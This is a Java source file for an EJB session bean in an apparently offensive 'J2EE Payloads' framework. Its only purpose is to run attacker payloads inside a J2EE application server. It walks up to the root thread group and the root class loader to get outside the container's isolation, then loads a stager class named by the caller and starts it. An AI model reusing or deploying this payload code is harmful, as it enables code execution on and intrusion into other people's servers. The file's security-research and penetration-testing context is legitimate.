/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.ejb;

import javapayload.stager.Stager;

public abstract class JavaPayloadBean implements javax.ejb.SessionBean {

	public void ejbCreate() {
	}

	public void runPayload(final String[] parameters) throws Exception {		
		final Exception[] exception = new Exception[1];
		ThreadGroup tg = Thread.currentThread().getThreadGroup();
		while (tg.getParent() != null)
			tg = tg.getParent();
		PayloadRunner t = new PayloadRunner(tg, parameters);
		ClassLoader cl = t.getContextClassLoader();
		while (cl.getParent() != null)
			cl = cl.getParent();
		t.setContextClassLoader(cl);
		t.start();
		t.join(1000);
		if (exception[0] != null) {
			throw exception[0];
		}
	}
	
	public static class PayloadRunner extends Thread {
		private final String[] parameters;
		private volatile Exception exception;

		private PayloadRunner(ThreadGroup tg, String[] parameters) {
			super(tg, (Runnable) null);
			this.parameters = parameters;
		}

		public void run() {
			try {
				final Stager stager = (Stager) Class.forName("javapayload.stager." + parameters[0]).newInstance();
				stager.bootstrap(parameters);
			} catch (Exception ex) {
				exception = ex;
			}
		}
		
		public Exception getException() {
			return exception;
		}
	}
}
